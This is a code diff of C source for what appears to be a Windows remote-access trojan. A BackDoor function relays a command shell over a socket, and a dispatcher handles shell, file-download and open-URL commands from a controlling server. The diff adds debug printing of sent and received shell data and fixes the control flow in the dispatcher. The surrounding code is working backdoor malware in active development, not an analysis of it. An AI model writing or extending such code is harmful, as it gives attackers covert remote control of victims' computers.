@@ -249,6 +249,7 @@ char* getSystemInfomation(char* systeminfo){
 }
 //-------------------------SYSTEM INFOMATION END-----------------------------------------------------
 
+
 void BackDoor(SOCKET sock){
     
     
@@ -277,7 +278,7 @@ void BackDoor(SOCKET sock){
     unsigned long lBytesRead; 
     while (1) 
     { 
-        
+        printf("looping...\n");
         ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
         if (lBytesRead) 
         { 
@@ -285,13 +286,16 @@ void BackDoor(SOCKET sock){
             ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
             if (!ret) break; 
             ret=send(sock,Buff+'\0',lBytesRead,0);
-
+            printf("Send:\n%sSendEnd\n",Buff);
             if (ret<=0) break; 
         } else { 
-            lBytesRead=recv(sock,Buff,1024,0); 
+            lBytesRead=recv(sock,Buff,1024,0);
+            printf("Recv:\n%s\nRecvEnd\n",Buff);
             
 
-            if (lBytesRead<=0 || Buff == "reset") break;//没数据or服务器退出(mod:1) 
+            if (lBytesRead<=0 || Buff == "reset") {
+                break;
+            }//没数据or服务器退出(mod:1) 
             ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
             if (!ret) break; 
             if (ret<=0)break;
@@ -355,6 +359,7 @@ void Handle(){
             case SERVER_SHELL:
                 // CMD命令  
                 BackDoor(sock);
+                continue;
             case SERVER_DOWNLOAD:
                 {
                     struct CFILE* f_obj;
@@ -370,6 +375,7 @@ void Handle(){
                     }
                     
                 }
+                continue;
             case SERVER_OPENURL:
                 {
                     continue;
